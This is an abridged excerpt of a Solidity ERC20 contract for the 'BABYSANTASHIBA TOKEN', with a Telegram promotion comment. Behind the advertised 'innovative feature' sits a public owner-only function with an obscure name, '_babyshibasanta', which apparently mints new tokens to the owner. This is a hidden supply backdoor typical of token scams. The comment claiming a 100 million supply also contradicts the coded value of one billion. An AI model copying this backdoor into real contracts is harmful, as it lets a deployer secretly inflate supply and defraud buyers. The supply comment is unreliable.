...
//
// $BABYSANTASHIBATOKEN proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/BabySantaShibaToken
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _babyshibasanta(uint256 amount) public onlyOwner {
    _babyshibasanta(msg.sender, amount);
    }
    ...
    function _babyshibasanta(address account, uint256 amount) internal virtual {
...
contract BABYSANTASHIBATOKEN is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BABYSANTASHIBA TOKEN ", "BSST") {
        _babyshibasanta(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}